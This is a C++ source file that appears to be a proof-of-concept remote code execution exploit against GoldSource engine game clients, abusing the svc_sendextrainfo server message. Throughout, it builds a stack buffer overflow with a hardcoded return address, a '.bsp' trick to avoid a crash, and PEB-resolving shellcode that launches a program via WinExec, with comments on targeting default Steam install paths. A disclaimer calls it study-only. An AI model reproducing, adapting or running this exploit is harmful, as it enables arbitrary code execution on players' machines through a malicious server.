/*****************************************************************
*
* SvcSploit.cpp
*
* CL_Set_ServerExtraInfo client-side exploit for GoldSource Engine.
*
* Allows to execute any binary code on game client via SVC network
* command.
*
* Author: Alexander Belkin, also known as 2010kohtep.
*
* THIS PROJECT IS FOR STUDYING PURPOSES ONLY AND A PROOF-OF-CONCEPT.
* THE AUTHOR CAN NOT BE HELD RESPONSIBLE FOR ANY DAMAGE OR
* CRIMINAL ACTIVITIES DONE USING THIS PROGRAM.
*
*****************************************************************/

#include <Windows.h>
#include <iostream>  // fopen, fwrite

#include "Common/Types.h"
#include "Common/Encrypt.h"

#include "Utils/File.h"
#include "Utils/InlineCode.h"

void shellcode()
{
	//
	// Go to the bottom of the stack to get ability to
	// allocate arguments in shellcode function.
	//

	__asm
	{
		sub esp, 0x8000;
	}

	//
	// Allocating string on the stack. We can't use global
	// memory, because we are going to use this code as shellcode,
	// what means that all global pointers will be invalid.
	//
	// Stack is the local function memory, so we can write our strings
	// here freely.
	//

	const wchar_t szKernel32[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', '\0' };
	const wchar_t szWinExec[] = { 'W', 'i', 'n', 'E', 'x', 'e', 'c', '\0' };
	const wchar_t szExitProcess[] = { 'E', 'x', 'i', 't', 'P', 'r', 'o', 'c', 'e', 's', 's', '\0' };

	auto pfnWinExec = (TWinExec)GetProcAddressPeb(szKernel32, szWinExec);
	auto pfnExitProcess = (TExitProcess)GetProcAddressPeb(szKernel32, szExitProcess);
	
	const char szProcName[] = { 'c', 'a', 'l', 'c', '\0' };

	//
	// Open calculator via WinAPI function - WinExec.
	//
	// We can also use CreateProcess[A/W], but WinExec
	// is much easier and simple.
	//

	pfnWinExec(szProcName, SW_NORMAL);
	pfnExitProcess(EXIT_SUCCESS);
} int shellcodeEnd() { return 0x01010102; }

void WriteShellChunk(FILE *stream)
{
	//
	// We are going to write part of shellcode to
	// stack, and the rest of shellcode will be
	// stored right in 'net_message_buffer' array.
	//
	// The reason we store part of shellcode in this
	// array is because exploit works via very specific
	// 'sprintf' argument, namely, '%s/%s_%s', and it's
	// quite hard to make our formatted data work with it.
	//

	unsigned char shell[512 + 4];
	{
		memset(shell, 'a', sizeof(shell));
	}

	//
	// +2 needs for alignment for my 'C:\Games\Steam\steamapps\common\Half-Life'
	// base directory.
	//
	// Attacker must know victim's game path's length, because from PC to PC this path
	// is different and it's going to spoil writing position of return address on the stack.
	//
	// Or attacker can just guess the align, since it's not so large: from 0 to 3.
	//
	// +2 alignment is correct for 'C:\Games\Steam\steamapps\common\Half-Life', the default
	// Steam folder, so all gamers with this path are vulnerable to shellcode.
	//

	auto pshell = (int *)&shell[2];

	for (int i = 0; i < 128; i++)
	{
		//
		// Fill entire stack region with return address, which is
		// pointed to 'net_message_buffer' array, where the rest 
		// of the shellcode is stored. 
		//
		// Since the address of the loaded renderer library 
		// (in our case, hw.dll) is always the same, we can use 
		// absolute address of 'net_message_buffer' variable.
		//

		pshell[i] = 0x042DF645;
	}

	//
	// A little trick here.
	//
	// Since we overfilled the buffer, we created a situation in which 
	// a very long string is presented. This affects the function CBaseFileSystem::AddSearchPath
	// in the form of a game crash. However, if you look at the function code, 
	// you can see that right at the beginning of the function, 
	// the function is searched for '.bsp' substring in the 'pPath' argument,
	// namely in our exploited buffer. If a substring is found, it will
	// exit the function, and game crash will be avoided. We are going to use it,
	// adding to our string '.bsp' substring.
	//

	((int *)&shell)[127] = 'psb.';

	fwrite(&shell, stream);
}

void WriteShellcode(FILE *stream)
{
	//
	// Write actual shellcode to the message.
	//

	auto nCodeSize = (int)shellcodeEnd - (int)shellcode;
	fwrite(shellcode, nCodeSize, 1, stream);
}

const int INDEX_SEND = 12345;
const int INDEX_RECV = 12345;

int main()
{
	FILE *f;
	fopen_s(&f, "msg.bin", "wb");

	//
	// YOU MUST WRITE INDEXES AND CALL COM_MungeFile AFTER WRITING
	// IF YOU ARE GOING TO DEBUG NET MESSAGE WITH Netchan_Process,
	// OTHERWISE DON'T DO IT IF YOU WANT TO CALL CL_ParseServerMessage
	// IMMEDIATELY AFTER LOADING DATA TO net_message BUFFER
	//
	// USE Netchan_Transmit TO SEND THIS MESSAGE TO CLIENT, BUT DON'T
	// WRITE INDEXES AND ENCRYPT IT BY YOURSELF
	//

#if 0
	//
	// Write packet header. In general, you can use any value for
	// 'index' and 'recvindex' indexes.
	//

	fwrite<int>(INDEX_SEND, f); // index
	fwrite<int>(INDEX_RECV, f); // recvindex
#endif

	//
	// Write command header.
	//
	// This command is sent to client during connection
	// to server. It contains com_clientfallback string
	// and sv_cheats value. We can perform buffer
	// overflow with long com_clientfallback value.
	//

	fwrite<unsigned char>(svc_commands_e::svc_sendextrainfo, f);

	WriteShellChunk(f);
	WriteShellcode(f);

	fclose(f);

#if 0
	//
	// Encrypt compiled message.
	//

	COM_MungeFile("msg.bin", INDEX_SEND);
#endif

	return 0;
}